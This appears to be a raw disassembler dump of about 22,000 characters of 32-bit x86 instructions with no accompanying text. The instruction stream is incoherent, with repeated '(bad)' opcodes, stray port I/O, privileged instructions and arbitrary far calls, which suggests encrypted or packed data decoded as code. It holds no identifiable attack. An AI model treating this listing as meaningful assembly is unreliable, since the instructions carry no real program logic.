  47fa1a:	add    DWORD PTR ds:0x6f42107e,edx
  47fa20:	je     0x47fa3a
  47fa22:	popa   
  47fa23:	nop
  47fa24:	mov    ah,0x81
  47fa26:	inc    ebx
  47fa27:	mov    edx,0x654f4ad8
  47fa2c:	pop    ds
  47fa2d:	push   0x6cdef7c2
  47fa32:	push   ss
  47fa33:	cwde   
  47fa34:	push   es
  47fa35:	mov    WORD PTR [esi-0x58102bf4],fs
  47fa3b:	add    ebx,DWORD PTR [edx+esi*8]
  47fa3e:	js     0x47fa60
  47fa40:	in     al,0x6e
  47fa42:	pusha  
  47fa43:	cs pop ebx
  47fa45:	test   DWORD PTR [esi-0x3e],edi
  47fa48:	pop    eax
  47fa49:	and    edi,ebp
  47fa4b:	in     al,0x88
  47fa4d:	call   0x5a6c:0xa0068a
  47fa54:	or     BYTE PTR [ecx],0xef
  47fa57:	ss test eax,ebp
  47fa5a:	sbb    edx,DWORD PTR [ebx]
  47fa5c:	jle    0x47fa20
  47fa5e:	xlat   BYTE PTR ds:[ebx]
  47fa5f:	in     al,0x6
  47fa61:	mov    ah,0x1c
  47fa63:	out    dx,eax
  47fa64:	in     al,dx
  47fa65:	push   es
  47fa66:	jbe    0x47fa30
  47fa68:	inc    edi
  47fa69:	adc    edi,DWORD PTR [esi]
  47fa6b:	push   es
  47fa6c:	js     0x47fa7d
  47fa6e:	out    dx,eax
  47fa6f:	in     al,dx
  47fa70:	mov    DWORD PTR [edx-0x5],eax
  47fa73:	mov    ah,0x97
  47fa75:	add    esp,esp
  47fa77:	push   ds
  47fa78:	cmp    BYTE PTR [ecx],dl
  47fa7a:	push   es
  47fa7b:	mov    al,ds:0x9b0e0220
  47fa80:	push   eax
  47fa81:	test   BYTE PTR [edi-0x74],cl
  47fa84:	call   0x5ece3f10
  47fa89:	add    BYTE PTR [edx],dl
  47fa8b:	rcr    DWORD PTR [esi],cl
  47fa8d:	cld    
  47fa8e:	push   DWORD PTR [eax-0x4ff94ff2]
  47fa94:	adc    esi,DWORD PTR [eax-0x384fec]
  47fa9a:	(bad)  
  47fa9b:	(bad)  
  47fa9c:	cld    
  47fa9d:	sbb    BYTE PTR es:[ebx-0x10efcffa],cl
  47faa4:	cmp    eax,0xf0cccf
  47faa9:	mov    dh,0x78
  47faab:	push   esi
  47faac:	or     al,0xe
  47faae:	dec    esi
  47faaf:	fcom   QWORD PTR [eax+0x65629055]
  47fab5:	ins    BYTE PTR es:[edi],dx
  47fab6:	out    dx,al
  47fab7:	pop    ss
  47fab8:	or     cl,dh
  47faba:	popa   
  47fabb:	mov    al,0x7
  47fabd:	sub    DWORD PTR [ebx-0x2b],ebx
  47fac0:	jns    0x47fad9
  47fac2:	fwait
  47fac3:	sbb    BYTE PTR [esi-0x7899e370],bl
  47fac9:	mov    esp,0x4282b01f
  47face:	ds cmp al,0x90
  47fad1:	xchg   BYTE PTR [esp+eiz*2+0x707835b0],cl
  47fad8:	push   es
  47fad9:	push   esp
  47fada:	stc    
  47fadb:	nop
  47fadc:	scas   eax,DWORD PTR es:[edi]
  47fadd:	pop    es
  47fade:	sbb    DWORD PTR [edx+0x5c],esi
  47fae1:	js     0x47fb4b
  47fae3:	out    0xa8,eax
  47fae5:	ds xor bh,cl
  47fae8:	daa    
  47fae9:	aad    0x95
  47faeb:	lods   eax,DWORD PTR ds:[esi]
  47faec:	push   eax
  47faed:	(bad)  
  47faee:	ins    BYTE PTR es:[edi],dx
  47faef:	imul   ecx,ebx,0x34
  47faf2:	mov    al,0x81
  47faf4:	adc    BYTE PTR [edi],bh
  47faf6:	or     al,0x82
  47faf8:	add    eax,0x2165c221
  47fafd:	inc    ecx
  47fafe:	mov    eax,ds:0xdc985e9
  47fb03:	sub    ebp,DWORD PTR [ebp+0x5c]
  47fb06:	push   eax
  47fb07:	push   esp
  47fb08:	xor    BYTE PTR [ecx],dl
  47fb0a:	test   DWORD PTR [esi],0x6ffe4114
  47fb10:	jb     0x47fb53
  47fb12:	mov    BYTE PTR [ecx],ah
  47fb14:	dec    esp
  47fb15:	xchg   DWORD PTR [edi],ecx
  47fb17:	pop    ss
  47fb18:	add    cl,cl
  47fb1a:	push   ecx
  47fb1b:	adc    bl,bh
  47fb1d:	add    DWORD PTR [ecx],edi
  47fb1f:	sub    ah,al
  47fb21:	xchg   DWORD PTR [edx],edx
  47fb23:	fiadd  DWORD PTR [ecx-0x1bfeef80]
  47fb29:	ror    DWORD PTR [eax+0x25886868],cl
  47fb2f:	das    
  47fb30:	add    BYTE PTR [edx+ecx*4],dl
  47fb33:	add    DWORD PTR [eax+esi*1],ecx
  47fb36:	add    al,0x3
  47fb38:	dec    edx
  47fb39:	retf   
  47fb3a:	xchg   esi,eax
  47fb3b:	or     eax,DWORD PTR [edx-0x5c]
  47fb3e:	aaa    
  47fb3f:	dec    edi
  47fb40:	sbb    BYTE PTR [ebp+0x48],bl
  47fb43:	add    eax,0x1adf917
  47fb48:	jb     0x47fadf
  47fb4a:	pop    esp
  47fb4b:	sbb    ebx,DWORD PTR [eiz*1+0x1d72130f]
  47fb52:	jo     0x47fb60
  47fb54:	sub    BYTE PTR [eax],ch
  47fb56:	sar    DWORD PTR [ecx],0xba
  47fb59:	nop    edx
  47fb5c:	lea    edx,[edi]
  47fb5e:	sahf   
  47fb5f:	es sub al,0xf5
  47fb62:	jb     0x47fb61
  47fb64:	mov    ebx,0x4554baf7
  47fb69:	or     BYTE PTR [esp+eax*2+0x45a48806],cl
  47fb70:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  47fb71:	sbb    edx,DWORD PTR [eax]
  47fb73:	or     al,0x20
  47fb75:	(bad)  
  47fb76:	jmp    0xc04919c
  47fb7b:	push   ss
  47fb7c:	outs   dx,BYTE PTR ds:[esi]
  47fb7d:	loopne 0x47fb07
  47fb7f:	add    esp,DWORD PTR [edi]
  47fb81:	inc    edx
  47fb82:	pop    esp
  47fb83:	loopne 0x47fb8b
  47fb85:	imul   eax,DWORD PTR [ecx],0xffffff9d
  47fb88:	dec    esp
  47fb89:	test   DWORD PTR [esi+ebp*1-0x7b90bcdc],edi
  47fb90:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  47fb91:	fidiv  DWORD PTR [edi-0x3dc2800]
  47fb97:	push   ds
  47fb98:	push   edi
  47fb99:	fdiv   DWORD PTR [eax+0x43]
  47fb9c:	leave  
  47fb9d:	add    eax,0x25244721
  47fba2:	pop    esp
  47fba3:	and    eax,0x27262017
  47fba8:	leave  
  47fba9:	add    eax,0x28b39617
  47fbae:	xchg   edx,eax
  47fbaf:	dec    esp
  47fbb0:	and    eax,0x2a2957
  47fbb5:	enter  0x1505,0xdd
  47fbb9:	sub    esp,DWORD PTR [ecx]
  47fbbb:	leave  
  47fbbc:	add    al,cl
  47fbbe:	sub    al,0x2d
  47fbc0:	ins    DWORD PTR es:[edi],dx
  47fbc1:	dec    eax
  47fbc2:	or     dl,cl
  47fbc4:	dec    ebp
  47fbc5:	or     BYTE PTR [eax+eax*4],0xc
  47fbc9:	inc    edi
  47fbca:	or     edi,DWORD PTR [ecx+0x43]
  47fbcd:	mov    BYTE PTR [ebp-0x3e87b388],bl
  47fbd3:	add    eax,0x4c2f90fb
  47fbd8:	gs popa 
  47fbda:	loop   0x47fc55
  47fbdc:	add    esi,DWORD PTR [edx]
  47fbde:	add    BYTE PTR [edx+0x30],dh
  47fbe1:	xor    DWORD PTR [eax+0x43],ebp
  47fbe4:	dec    edx
  47fbe5:	fadd   DWORD PTR [ebp+0x540d2e6c]
  47fbeb:	push   ds
  47fbec:	cs cwde 
  47fbee:	add    BYTE PTR [esi-0x6d],al
  47fbf1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  47fbf2:	(bad)  
  47fbf3:	xor    eax,ecx
  47fbf5:	call   0x36ac17f2
  47fbfa:	or     BYTE PTR [ebp+0x63],ah
  47fbfd:	dec    esi
  47fbfe:	ins    BYTE PTR es:[edi],dx
  47fbff:	ins    DWORD PTR es:[edi],dx
  47fc00:	cld    
  47fc01:	fiadd  WORD PTR [edx]
  47fc03:	adc    esp,DWORD PTR [eax+edx*1+0x4365708e]
  47fc0a:	push   ss
  47fc0b:	dec    esp
  47fc0c:	outs   dx,DWORD PTR ds:[esi]
  47fc0d:	ja     0x47fc37
  47fc0f:	and    BYTE PTR [eax+ecx*4],dl
  47fc12:	lods   eax,DWORD PTR ds:[esi]
  47fc13:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  47fc14:	sbb    eax,0x5efe29d8
  47fc19:	add    DWORD PTR [eax],ebp
  47fc1b:	outs   dx,BYTE PTR ds:[esi]
  47fc1c:	pop    ds
  47fc1d:	in     al,0x6d
  47fc1f:	and    ebx,DWORD PTR [ecx-0x5b]
  47fc22:	out    0x42,eax
  47fc24:	add    BYTE PTR [esi],dl
  47fc26:	and    BYTE PTR [esi],dh
  47fc28:	xor    al,dl
  47fc2a:	push   ds
  47fc2b:	test   BYTE PTR [esp+eiz*8],bl
  47fc2e:	lock xchg ebx,eax
  47fc30:	inc    edx
  47fc31:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  47fc32:	xor    dl,BYTE PTR [esp+ecx*4]
  47fc35:	adc    DWORD PTR [eax-0x7323bdf1],0x1db9b442
  47fc3f:	in     al,0xc4
  47fc41:	xor    al,0x43
  47fc43:	cld    
  47fc44:	nop
  47fc45:	mov    dh,0xb8
  47fc47:	xchg   ecx,eax
  47fc48:	inc    edx
  47fc49:	xchg   edx,eax
  47fc4a:	inc    edx
  47fc4b:	inc    eax
  47fc4c:	push   esi
  47fc4d:	push   ds
  47fc4e:	test   al,0x37
  47fc50:	int3   
  47fc51:	xchg   edx,eax
  47fc52:	inc    edx
  47fc53:	inc    esp
  47fc54:	push   edx
  47fc55:	(bad)  
  47fc57:	mov    ah,0xef
  47fc59:	mov    esp,0x68ef8d6
  47fc5e:	mov    ah,0x60
  47fc60:	jbe    0x47fc8a
  47fc62:	(bad)  
  47fc63:	push   ss
  47fc64:	fsubr  DWORD PTR [esi-0x7c]
  47fc67:	fidivr WORD PTR [ebx-0x74]
  47fc6a:	push   cs
  47fc6b:	les    eax,FWORD PTR [esi]
  47fc6d:	or     BYTE PTR [edx],dl
  47fc6f:	adc    BYTE PTR [eax+0x7f4d011a],dh
  47fc75:	pop    ss
  47fc76:	not    BYTE PTR [ecx]
  47fc78:	mov    ebp,0x7bb012
  47fc7d:	mov    bl,0x94
  47fc7f:	xchg   esp,eax
  47fc80:	int    0xe7
  47fc82:	jns    0x47fc22
  47fc84:	test   BYTE PTR [esi],0xe4
  47fc87:	pushf  
  47fc88:	les    esp,FWORD PTR [eax]
  47fc8a:	xchg   ebp,eax
  47fc8b:	pop    eax
  47fc8c:	inc    ebp
  47fc8d:	cs cmp al,0x3c
  47fc90:	int3   
  47fc91:	dec    edx
  47fc92:	or     edx,ecx
  47fc94:	adc    DWORD PTR gs:[eax+0x7],ebx
  47fc98:	and    esi,0xffffffc7
  47fc9b:	pop    es
  47fc9c:	and    eax,0x602e1318
  47fca1:	or     DWORD PTR [esp+ecx*1-0x1f],edi
  47fca5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  47fca6:	cdq    
  47fca7:	or     dh,BYTE PTR [eax+eiz*4-0x3bf4fe4d]
  47fcae:	es dec edx
  47fcb0:	sbb    al,0xb8
  47fcb2:	outs   dx,BYTE PTR ds:[esi]
  47fcb3:	mov    edi,0x80051f6f
  47fcb8:	pushf  
  47fcb9:	loop   0x47fc5b
  47fcbb:	outs   dx,DWORD PTR ds:[esi]
  47fcbc:	ja     0x47fc6e
  47fcbe:	ins    BYTE PTR es:[edi],dx
  47fcbf:	and    DWORD PTR [ebx],edi
  47fcc1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  47fcc2:	cmp    BYTE PTR ds:0x6fac0754,al
  47fcc8:	sbb    DWORD PTR [esi-0x63],eax
  47fccb:	xchg   bh,dl
  47fccd:	lea    esp,[esi+eax*1]
  47fcd0:	inc    ecx
  47fcd1:	sti    
  47fcd2:	add    BYTE PTR ss:[edi-0x5ce9331f],dl
  47fcd9:	aas    
  47fcda:	adc    BYTE PTR [edx],al
  47fcdc:	pop    es
  47fcdd:	pop    ds
  47fcde:	sar    cl,cl
  47fce0:	or     dl,BYTE PTR [ebp+0xd]
  47fce3:	add    BYTE PTR [edx],cl
  47fce5:	jmp    0x47fcd4
  47fce7:	inc    eax
  47fce8:	repnz adc BYTE PTR [esi-0x305ffdf1],bl
  47fcef:	ret    0x3762
  47fcf2:	outs   dx,DWORD PTR ds:[esi]
  47fcf3:	xchg   edx,eax
  47fcf4:	pop    ss
  47fcf5:	into   
  47fcf6:	mov    eax,0xf8e0f81
  47fcfb:	inc    edx
  47fcfc:	gs jbe 0x47fd3b
  47fcff:	out    dx,eax
  47fd00:	mov    bl,0x60
  47fd02:	mov    cl,BYTE PTR [eax+0x73]
  47fd05:	adc    al,0x48
  47fd07:	arpl   WORD PTR [edx+ecx*2+0x6f],si
  47fd0b:	scas   eax,DWORD PTR es:[edi]
  47fd0c:	xchg   edx,eax
  47fd0d:	fst    QWORD PTR [eax]
  47fd0f:	dec    ecx
  47fd10:	dec    ecx
  47fd11:	outs   dx,BYTE PTR ds:[esi]
  47fd12:	pop    ebx
  47fd13:	repnz mov esp,0x92b83c02
  47fd19:	gs call 0x140af428
  47fd1f:	mov    al,ds:0xd449aa11
  47fd24:	xchg   ecx,eax
  47fd25:	stc    
  47fd26:	ss ins BYTE PTR es:[edi],dx
  47fd28:	dec    ecx
  47fd29:	fs pop es
  47fd2b:	adc    dl,BYTE PTR [ecx+0xf74754f]
  47fd31:	mov    ecx,0x13c58460
  47fd36:	mov    eax,0x784c15a
  47fd3b:	xchg   BYTE PTR [esi+edx*1-0x50],al
  47fd3f:	lock mov ebp,cs
  47fd42:	(bad)  
  47fd43:	daa    
  47fd44:	or     ecx,edx
  47fd46:	adc    al,0x3e
  47fd48:	inc    ecx
  47fd49:	stc    
  47fd4a:	sbb    al,al
  47fd4c:	or     DWORD PTR [ecx],esi
  47fd4e:	sbb    edx,DWORD PTR [ebx]
  47fd50:	dec    edx
  47fd51:	adc    al,0x8d
  47fd53:	inc    edx
  47fd54:	adc    BYTE PTR ds:0x1373b162,0xc9
  47fd5b:	add    eax,0x17169ba7
  47fd60:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  47fd61:	and    al,BYTE PTR [ebx]
  47fd63:	and    BYTE PTR [eax],bl
  47fd65:	push   ebp
  47fd66:	and    eax,0x1905c957
  47fd6b:	sbb    dl,BYTE PTR [eax+0x72]
  47fd6e:	xchg   esp,eax
  47fd6f:	sbb    al,0x1b
  47fd71:	sbb    al,0x24
  47fd73:	test   DWORD PTR [eax-0x38],edi
  47fd76:	sbb    eax,0x8d820211
  47fd7b:	jnp    0x47fd09
  47fd7d:	(bad)  
  47fd7f:	dec    eax
  47fd80:	imul   edi,DWORD PTR [esi-0x31a7794f],0xe9345c3e
  47fd8a:	inc    eax
  47fd8b:	test   BYTE PTR [eax-0x7c],bl
  47fd8e:	inc    ebp
  47fd8f:	pop    ds
  47fd90:	cmp    dh,al
  47fd92:	sbb    bl,ah
  47fd94:	dec    ecx
  47fd95:	ins    DWORD PTR es:[edi],dx
  47fd96:	gs adc eax,0x9c8842e8
  47fd9c:	mov    BYTE PTR [esi],ah
  47fd9e:	pop    edx
  47fd9f:	outs   dx,DWORD PTR ds:[esi]
  47fda0:	inc    edx
  47fda1:	and    BYTE PTR [ebx+0x4f],al
  47fda4:	inc    DWORD PTR [ebp-0x78]
  47fda7:	out    dx,eax
  47fda8:	or     dh,dl
  47fdaa:	cmp    al,0x8d
  47fdac:	jns    0x47fdb7
  47fdae:	dec    ebp
  47fdaf:	popa   
  47fdb0:	js     0x47fdfe
  47fdb2:	outs   dx,BYTE PTR gs:[esi]
  47fdb4:	repnz cmp al,0x87
  47fdb7:	mov    al,ds:0x12464667
  47fdbc:	ins    BYTE PTR es:[edi],dx
  47fdbd:	nop
  47fdbe:	mov    al,0xa
  47fdc0:	pop    ss
  47fdc1:	and    cl,dl
  47fdc3:	inc    ebp
  47fdc4:	dec    ebp
  47fdc5:	jb     0x47fe08
  47fdc7:	lods   al,BYTE PTR ds:[esi]
  47fdc8:	mov    ebp,es
  47fdca:	imul   esp,DWORD PTR [ebx],0x55cd2003
  47fdd0:	add    BYTE PTR [eiz*1+0x200313aa],ah
  47fdd7:	es mov ebx,0xe42e0e79
  47fddd:	daa    
  47fdde:	sub    dh,cl
  47fde0:	or     eax,0xa26e8df0
  47fde5:	or     ebp,DWORD PTR [eax]
  47fde7:	rcl    BYTE PTR [eax+0x73],1
  47fdea:	jae    0x47fe63
  47fdec:	lods   al,BYTE PTR ds:[esi]
  47fded:	nop
  47fdee:	or     esp,DWORD PTR [edx+0x18]
  47fdf1:	imul   ecx,DWORD PTR [ecx],0xe4261929
  47fdf7:	fwait
  47fdf8:	push   cs
  47fdf9:	xchg   esp,eax
  47fdfa:	js     0x47fd8a
  47fdfc:	sub    bl,al
  47fdfe:	aaa    
  47fdff:	add    BYTE PTR [ecx+ebp*2+0x7251f450],bl
  47fe06:	inc    ecx
  47fe07:	lods   al,BYTE PTR ds:[esi]
  47fe08:	std    
  47fe09:	sub    eax,DWORD PTR [esi]
  47fe0b:	pop    es
  47fe0c:	push   es
  47fe0d:	leave  
  47fe0e:	sub    al,0x49
  47fe10:	sbb    eax,0x17835884
  47fe15:	aad    0x4
  47fe17:	enter  0x5989,0x2f
  47fe1b:	mov    al,0x3b
  47fe1d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  47fe1e:	jmp    0xc85419b7
  47fe23:	sbb    BYTE PTR cs:[esi-0x639bc1f9],dl
  47fe2a:	sub    edx,DWORD PTR [ebp+0x2f]
  47fe2d:	iret   
  47fe2e:	inc    ebx
  47fe2f:	leave  
  47fe30:	add    eax,0x31303931
  47fe35:	pop    esp
  47fe36:	and    eax,0x33322017
  47fe3b:	scas   al,BYTE PTR es:[edi]
  47fe3c:	mov    dh,BYTE PTR [ebp-0x6b]
  47fe3f:	xor    al,0xed
  47fe41:	xor    eax,0x4a992a64
  47fe46:	ss aaa 
  47fe48:	outs   dx,DWORD PTR ds:[esi]
  47fe49:	mov    WORD PTR [ebx+0x72c038a1],ss
  47fe4f:	int3   
  47fe50:	fmul   DWORD PTR [eax]
  47fe52:	xor    BYTE PTR [edx+0x21],0x39
  47fe56:	repnz mov ah,0xc7
  47fe59:	push   eax
  47fe5a:	out    dx,al
  47fe5b:	mov    edx,0xe046c30c
  47fe60:	loopne 0x47fea6
  47fe62:	mov    ds:0x3a17cb,al
  47fe67:	or     dl,BYTE PTR [eax-0x62]
  47fe6a:	push   eax
  47fe6b:	xchg   esp,eax
  47fe6c:	or     edi,DWORD PTR [ecx]
  47fe6e:	call   0xe85ee704
  47fe73:	cmp    esp,DWORD PTR [eax]
  47fe75:	pop    ss
  47fe76:	int3   
  47fe77:	cli    
  47fe78:	dec    eax
  47fe79:	push   ebp
  47fe7a:	jo     0x47feef
  47fe7c:	cmp    al,0x25
  47fe7e:	add    esp,DWORD PTR [eax]
  47fe80:	add    edi,DWORD PTR ds:0x6200643e
  47fe86:	dec    esp
  47fe87:	aas    
  47fe88:	stc    
  47fe89:	inc    eax
  47fe8a:	dec    eax
  47fe8b:	mov    esi,0xb076b5a6
  47fe90:	ja     0x47fed4
  47fe92:	xchg   DWORD PTR [edx+0x782c1f9b],edx
  47fe98:	inc    edx
  47fe99:	add    BYTE PTR [eax+edi*2],ch
  47fe9c:	int    0x42
  47fe9e:	je     0x47fe35
  47fea0:	pop    es
  47fea1:	in     al,0xca
  47fea3:	xchg   ebp,eax
  47fea4:	inc    edx
  47fea5:	enter  0x42fb,0x74
  47fea9:	cld    
  47feaa:	inc    edx
  47feab:	mov    ah,0xfa
  47fead:	adc    bh,al
  47feaf:	sahf   
  47feb0:	or     ebp,esi
  47feb2:	inc    esi
  47feb3:	sub    BYTE PTR [esi],bh
  47feb5:	ror    bh,0x10
  47feb8:	fild   QWORD PTR [ebx]
  47feba:	or     BYTE PTR [esi+0x5c46a00c],0x1e
  47fec1:	adc    al,dl
  47fec3:	neg    DWORD PTR [esi+0x6be9ef7]
  47fec9:	xchg   esp,eax
  47feca:	push   ss
  47fecb:	dec    esp
  47fecc:	push   cs
  47fecd:	lock rcl BYTE PTR [esi+0x10],1
  47fed1:	aas    
  47fed2:	out    dx,eax
  47fed3:	cmp    esp,esi
  47fed5:	cmp    eax,0x456781e
  47feda:	std    
  47fedb:	jle    0x47fee3
  47fedd:	xor    BYTE PTR [esi],ah
  47fedf:	jo     0x47fefc
  47fee1:	test   edi,ebp
  47fee3:	cmp    eax,0x16540674
  47fee8:	(bad)  
  47fee9:	stc    
  47feea:	jp     0x47ff40
  47feec:	inc    edx
  47feed:	jecxz  0x47fe95
  47feef:	push   ebp
  47fef0:	lods   eax,DWORD PTR ds:[esi]
  47fef1:	jne    0x47ff55
  47fef3:	outs   dx,BYTE PTR ds:[esi]
  47fef4:	xor    DWORD PTR [eax],edx
  47fef6:	dec    ecx
  47fef7:	ret    0x8be0
  47fefa:	ror    BYTE PTR [esi+esi*2+0x37bc6bdf],0x6d
  47ff02:	pop    ds
  47ff03:	pop    esp
  47ff04:	push   ss
  47ff05:	jbe    0x47ff0d
  47ff07:	or     al,0x1f
  47ff09:	and    DWORD PTR [edi],eax
  47ff0b:	call   0xee:0x32a45781
  47ff12:	nop
  47ff13:	pop    es
  47ff14:	xor    al,0x96
  47ff16:	loopne 0x47fea6
  47ff18:	data16 loopne 0x47ff60
  47ff1b:	and    eax,0x5797d0a7
  47ff20:	mov    ebp,0xa783128b
  47ff25:	fsub   DWORD PTR [esi-0x527e8824]
  47ff2b:	in     eax,dx
  47ff2c:	push   es
  47ff2d:	add    al,0xd2
  47ff2f:	mov    ebp,0xffd94614
  47ff34:	pop    eax
  47ff35:	xor    BYTE PTR [ebp-0x5b41961f],0x6
  47ff3c:	mov    BYTE PTR [esi+0x62930ed0],dl
  47ff42:	sbb    eax,0x46c7091e
  47ff47:	outs   dx,DWORD PTR ds:[esi]
  47ff48:	pop    es
  47ff49:	sub    eax,0xc38ceb50
  47ff4e:	mov    dh,0xcc
  47ff50:	ret    
  47ff51:	and    al,0x27
  47ff53:	xchg   BYTE PTR [edi+0x56],ch
  47ff56:	add    BYTE PTR [edx-0x19],bh
  47ff59:	adc    al,0x7b
  47ff5b:	inc    eax
  47ff5c:	ds int 0xe6
  47ff5f:	aam    0x7a
  47ff61:	push   es
  47ff62:	jnp    0x47ff7c
  47ff64:	inc    eax
  47ff65:	js     0x47ffa0
  47ff67:	add    eax,0x980889c9
  47ff6c:	sbb    al,0x99
  47ff6e:	inc    eax
  47ff6f:	cmovb  ebx,DWORD PTR [esi]
  47ff72:	pop    eax
  47ff73:	cdq    
  47ff74:	inc    edx
  47ff75:	xchg   esp,eax
  47ff76:	cwde   
  47ff77:	push   eax
  47ff78:	mov    al,ds:0x5dee006
  47ff7d:	retf   0xda07
  47ff80:	xor    eax,0xf00b7bed
  47ff85:	(bad)  
  47ff86:	jmp    0x47ff0c
  47ff88:	inc    DWORD PTR [edx+ecx*4-0x6587f90c]
  47ff8f:	push   cs
  47ff90:	jo     0x47ffce
  47ff92:	int    0xf7
  47ff94:	cmp    al,0xf8
  47ff96:	int3   
  47ff97:	push   es
  47ff98:	ins    BYTE PTR es:[edi],dx
  47ff99:	cwde   
  47ff9a:	nop
  47ff9b:	pop    es
  47ff9c:	ret    0x883a
  47ff9f:	ss icebp 
  47ffa1:	sahf   
  47ffa2:	xchg   edi,eax
  47ffa3:	pop    es
  47ffa4:	sbb    eax,0x1d8a9261
  47ffa9:	ror    DWORD PTR [eax+0x26310079],1
  47ffaf:	mov    cl,0x6e
  47ffb1:	and    DWORD PTR [ebx-0x124d33e],esp
  47ffb7:	fdivr  st,st(7)
  47ffb9:	outs   dx,DWORD PTR ds:[esi]
  47ffba:	adc    BYTE PTR [esi+0x64a062a],bl
  47ffc0:	xor    DWORD PTR [edi-0x52dffcef],esi
  47ffc6:	test   eax,0xe60a2207
  47ffcb:	xor    eax,0xe20e00cb
  47ffd0:	mov    ecx,0x265396e0
  47ffd5:	nop    DWORD PTR [bx+di+0x20]
  47ffda:	add    al,0xaf
  47ffdc:	adc    BYTE PTR [edx],al
  47ffde:	es es fs xor eax,0x7429808
  47ffe6:	jb     0x480029
  47ffe8:	mov    WORD PTR [edi+eiz*8],cs
  47ffeb:	pop    ss
  47ffec:	adc    ah,BYTE PTR ds:0x1355c947
  47fff2:	adc    al,0xe0
  47fff4:	xor    dl,BYTE PTR [esp+ebx*1+0x66241615]
  47fffb:	sub    al,0xe4
  47fffd:	loope  0x480055
  47ffff:	adc    al,0x6c
  480001:	adc    al,0xfa
  480003:	sbb    BYTE PTR [ecx+eax*8+0x78],dh
  480007:	mov    esi,0xa273a861
  48000c:	pusha  
  48000d:	and    eax,0x18f99417
  480012:	mov    ecx,0xcb6eae4a
  480017:	sbb    DWORD PTR [edx],ebx
  480019:	bound  ebp,QWORD PTR [edx]
  48001b:	mov    ecx,0x701c1b00
  480020:	xchg   esp,eax
  480021:	sbb    al,0x35
  480023:	int    0x1d
  480025:	push   ds
  480026:	push   ebx
  480027:	jmp    0x48002e
  480029:	aaa    
  48002a:	retf   
  48002b:	mov    cl,0x31
  48002d:	leave  
  48002e:	pop    ds
  48002f:	cmp    DWORD PTR [eax+0x209203f],edx
  480035:	add    bh,bh
  480037:	hlt    
  480038:	xchg   edi,eax
  480039:	and    BYTE PTR [eax+0x2128e4a1],dl
  48003f:	and    cl,BYTE PTR [edx+0x2e]
  480042:	sbb    BYTE PTR [ecx-0x1b56dcbb],dh
  480048:	sub    bh,BYTE PTR [ecx+0x4a192524]
  48004e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  48004f:	xchg   edx,eax
  480050:	es daa 
  480052:	sub    BYTE PTR [edx+0x2922e4a9],dl
  480058:	sub    al,BYTE PTR [eax]
  48005a:	sbb    DWORD PTR [edx-0x52],ecx
  48005d:	sub    ebp,DWORD PTR [eax+ebp*1]
  480060:	sbb    DWORD PTR [eax],eax
  480062:	sbb    DWORD PTR ds:0x32022e,ebp
  480068:	repnz sub BYTE PTR [edi],0x30
  48006c:	call   0x7f78a130
  480071:	add    eax,DWORD PTR [eax-0x7f235e40]
  480077:	inc    edx
  480078:	sub    eax,0xa80c7b88
  48007d:	mov    edx,0xf4676cb9
  480082:	inc    eax
  480083:	test   DWORD PTR [ecx-0x14],esi
  480086:	sbb    al,0xba
  480088:	imul   edx,DWORD PTR [edi],0xa0757740
  48008e:	add    al,0xf0
  480090:	stos   DWORD PTR es:[edi],eax
  480091:	or     BYTE PTR [edi+ecx*1],al
  480094:	add    esp,DWORD PTR [ebx+ebx*2]
  480097:	xchg   DWORD PTR [esi],ebp
  480099:	add    bl,BYTE PTR [edx-0x7f7c7498]
  48009f:	add    BYTE PTR [edx-0x7d3f35ff],bh
  4800a5:	xor    al,0xf3
  4800a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4800a8:	mov    edx,0x961f8138
  4800ad:	inc    esi
  4800ae:	add    al,0x6d
  4800b0:	inc    esp
  4800b1:	sbb    al,0x99
  4800b3:	push   esi
  4800b4:	push   esi
  4800b5:	xor    eax,DWORD PTR [eax+0x596f69bb]
  4800bb:	sub    al,BYTE PTR [eax+0x1c]
  4800be:	and    eax,0x7026c56b
  4800c3:	lods   al,BYTE PTR ds:[esi]
  4800c4:	aaa    
  4800c5:	or     bh,al
  4800c7:	iret   
  4800c8:	dec    ebp
  4800c9:	das    
  4800ca:	add    esi,DWORD PTR [edx]
  4800cc:	call   0xfc6c6454
  4800d1:	pop    ebx
  4800d2:	dec    eax
  4800d3:	or     eax,0x11374f48
  4800d8:	push   edi
  4800d9:	xor    al,0x70
  4800db:	cmp    DWORD PTR [ebx+edx*8-0x12],0xffffff84
  4800e0:	mov    ebx,0xfac70bd9
  4800e5:	and    BYTE PTR [esi],bl
  4800e7:	sbb    al,0x3
  4800e9:	mov    BYTE PTR [edx-0x60],al
  4800ec:	nop
  4800ed:	test   al,0xc4
  4800ef:	sub    esp,edx
  4800f1:	nop
  4800f2:	sar    BYTE PTR [esi+eax*2+0x55],cl
  4800f6:	mov    al,0x46
  4800f8:	sbb    al,bh
  4800fa:	push   ds
  4800fb:	mov    ch,0xfc
  4800fd:	pusha  
  4800fe:	cmp    DWORD PTR [ebp-0x50],0xffffffd3
  480102:	dec    edi
  480103:	fimul  DWORD PTR [ebx+0x50]
  480106:	int3   
  480107:	lods   al,BYTE PTR cs:[esi]
  480109:	mov    eax,DWORD PTR [ebp+0x43]
  48010c:	ficom  DWORD PTR ds:0x24dfac89
  480112:	test   al,0x86
  480114:	xor    BYTE PTR ds:0xc7f5a889,dl
  48011a:	aam    0x46
  48011c:	les    esp,FWORD PTR [ecx-0x63]
  48011f:	push   edi
  480120:	js     0x4800c0
  480122:	je     0x4800f7
  480124:	test   BYTE PTR [ecx+0x40],cl
  480127:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  480128:	mov    ah,0xf4
  48012a:	mov    eax,ds:0x649e5b60
  48012f:	mov    edx,0xf75e2c8
  480134:	fdivr  QWORD PTR [esi+0x854ee22]
  48013a:	inc    esp
  48013b:	out    dx,eax
  48013c:	jmp    0x480166
  48013e:	sbb    al,0x8b
  480140:	inc    ebx
  480141:	dec    eax
  480142:	xor    edx,ebx
  480144:	pop    esi
  480145:	pusha  
  480146:	or     al,0x2b
  480148:	inc    ebp
